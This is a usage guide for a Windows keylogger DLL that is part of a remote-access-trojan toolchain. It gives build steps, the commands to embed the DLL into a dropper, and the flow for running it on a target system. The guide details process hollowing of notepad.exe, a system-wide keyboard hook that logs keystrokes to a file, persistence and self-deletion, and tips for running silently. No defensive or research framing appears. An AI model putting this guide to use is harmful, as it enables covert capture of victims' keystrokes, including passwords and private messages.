# Keylogger.dll — Usage Guide

## Overview
**Keylogger.dll** is the first functional payload built on the RAT-win32 toolchain. When deployed via LoadMe, it injects itself into a target process (`notepad.exe` by default) and installs a system-wide low-level keyboard hook (`WH_KEYBOARD_LL`) that logs every key press to `log.txt` in the working directory of the host process.

The DLL exports two functions:

| Export | Called by | Purpose |
| :--- | :--- | :--- |
| `firstEntry` | LoadMe (`rundll32.exe`) | Resolves the DLL's own path on disk and triggers self-injection into the target process. |
| `entryPoint` | `AutoInject` shellcode | Runs inside the injected process; installs the keyboard hook and blocks in the message loop. |

---

## Setup

### 1 — Compile Keylogger.dll
Build all source files (`main.cpp`, `Keylogger.cpp`, `InjectTools.cpp`) as a 64-bit DLL. Both exports (`firstEntry`, `entryPoint`) are emitted automatically via `extern "C" __declspec(dllexport)`.

Required libraries (declared via `#pragma comment` in `InjectTools.h`):
- `ntdll.lib`
- `psapi.lib`

### 2 — Update LoadMe entry point name
`loadder.cpp` must reference the corrected export name. Verify the constant reads:
```cpp
const LPCWSTR runningFunctionName = L"firstEntry";
```
Recompile LoadMe if it still uses `fristEntry`.

### 3 — Embed the DLL into LoadMe
```
Injector.exe .extra LoadMe.exe Keylogger.dll
```
> Do not use `.data` as the section name.

### 4 — Run the modified LoadMe.exe
Execute the modified `LoadMe.exe` on the target system. The launcher handles extraction, persistence, and self-deletion automatically. See [LoadMe/loadder.cpp.md](../LoadMe/loadder.cpp.md) for the full dropper flow.

---

## Execution Flow

```
LoadMe.exe
  └─ drops Keylogger.dll to %APPDATA%\<ticks>.dll
  └─ rundll32.exe "%APPDATA%\<ticks>.dll",firstEntry
       └─ DllMain  →  dllParam = HMODULE, wasDllMainCalled = TRUE
       └─ firstEntry()
            └─ GetModuleFileNameA(dllParam)  →  resolves DLL path on disk
            └─ MessageBoxA  →  shows resolved path (debug confirmation)
            └─ InjectTools::AutoInject("notepad.exe", dllPath)
                 └─ CreateProcess(notepad.exe, SUSPENDED)
                 └─ NtUnmapViewOfSection  →  removes original notepad image
                 └─ Manual map: headers + sections written to target
                 └─ Relocations patched (IMAGE_REL_BASED_DIR64)
                 └─ IAT patched
                 └─ PEB ImageBase updated
                 └─ Shellcode:
                      call DllMain(newBase, DLL_PROCESS_ATTACH, NULL)
                      call entryPoint()
                           └─ Keylogger::Init()
                                └─ SetWindowsHookExA(WH_KEYBOARD_LL, HookProc)
                                └─ GetMessage loop  (blocks thread)
                                     └─ on each WM_KEYDOWN:
                                          HookProc writes to log.txt
```

---

## Output

`log.txt` is written in **append mode** to the current working directory of the injected process. Each key-down event produces one line:
```
Key was pressed: 65 (char: A)
Key was pressed: 13 (char: )
```
The numeric value is the Windows Virtual-Key code. The `char` cast is accurate only for printable ASCII keys — see [`Keylogger.cpp.md`](Keylogger.cpp.md) for how to improve character translation.

---

## Changing the Injection Target

Open `main.cpp` and update `targetPath`:
```cpp
LPSTR targetPath = const_cast<LPSTR>("C:\\Path\\To\\YourTarget.exe");
```
Recompile and re-embed with `Injector.exe`. The target must be a 64-bit process.

---

## Important Notes

> **64-bit only.** The injection engine handles only `IMAGE_REL_BASED_DIR64` relocations and uses the x64 register ABI in its shellcode. Do not target 32-bit processes.

> **Blocking `entryPoint`.** `Keylogger::Init()` blocks indefinitely in `GetMessage`. The injected thread never returns from `entryPoint`. To run the hook in the background and let the host process continue normally, uncomment the `KeyloggerThread` / `CreateThread` block in `main.cpp` and recompile. See [`Keylogger.cpp.md`](Keylogger.cpp.md) for the full pattern.

> **Log file path.** `log.txt` is written relative to the host process working directory. The exact location depends on which process is injected and how it was launched. Use a hardcoded absolute path in `HookProc` for predictable output location.

> **Hook handle not stored.** The `HHOOK` returned by `SetWindowsHookExA` is not saved, so the hook cannot be cleanly removed at runtime. See [`Keylogger.cpp.md`](Keylogger.cpp.md) for the teardown pattern using `DLL_PROCESS_DETACH`.

> **Debug message box.** `firstEntry` displays a `MessageBoxA` with the DLL path before injecting. Remove the `wsprintfA` / `MessageBoxA` block in `main.cpp` before deploying in a silent context.

> **IAT resolution.** Function addresses are resolved from the injector's address space. See [`InjectTools.cpp.md`](InjectTools.cpp.md) → [ExampleDLL/dllTools.cpp.md](../ExampleDLL/dllTools.cpp.md) for the known limitation and the remote-base-adjusted fix.